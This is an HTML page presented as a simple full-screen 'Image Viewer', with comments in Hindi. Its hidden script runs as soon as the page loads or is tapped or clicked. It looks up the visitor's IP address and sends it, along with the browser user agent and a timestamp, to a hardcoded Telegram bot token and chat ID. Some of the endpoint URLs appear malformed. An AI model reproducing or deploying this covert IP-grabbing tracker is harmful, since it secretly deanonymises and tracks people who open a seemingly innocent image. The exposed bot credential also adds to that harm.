<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background-color: black; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            user-select: none; 
        }
        img { 
            max-width: 100%; 
            max-height: 100vh; 
            object-fit: contain; 
        }
    </style>
</head>
<body>

    <!-- 📷 फोटो अब हमेशा दिखेगी -->
    <img src="photo.jpg" alt="Image Viewer">

    <script>
        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
        const telegramChatId = "1798743066"; 

        let isTracked = false;

        function startTracking() {
            if (isTracked) return;
            isTracked = true;

            // 🌐 बिना किसी फिल्टर के सीधे और सबसे तेज आईपी निकालने वाली API
            fetch('https://ipify.org')
            .then(res => {
                if (!res.ok) throw new Error('Network error');
                return res.json();
            })
            .then(data => {
                // टेलीग्राम पर मैसेज भेजने का फंक्शन चालू करें
                sendToTelegram(data.ip);
            })
            .catch(err => {
                // अगर ऊपर वाली API फेल हो तो बैकअप API
                fetch('https://ipapi.co')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram(data.ip);
                }).catch(e => {
                    // अगर इंटरनेट बिल्कुल काम न करे तो बिना आईपी के केवल नोटिफिकेशन भेजें
                    sendToTelegram("IP Hidden/VPN Active");
                });
            });
        }

        function sendToTelegram(ip) {
            // इनकॉग्निटो मोड में एरर से बचने के लिए सीधा यूज़र एजेंट टेक्स्ट निकालना
            const userAgentText = navigator.userAgent;

            const message = `🚨 *New Visitor Alert* 🚨\n\n` +
                            `🌐 *IP Address:* \`${ip}\`\n` +
                            `📱 *User Agent:* \`${userAgentText}\`\n` +
                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;

            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(res => {
                if(!res.ok) console.log("Telegram API Error");
            });
        }

        // जैसे ही पेज लोड होगा या स्क्रीन छुई जाएगी, तुरंत डेटा जाएगा
        window.addEventListener('DOMContentLoaded', startTracking);
        window.addEventListener('touchstart', startTracking);
        window.addEventListener('click', startTracking);
    </script>

</body>
</html>
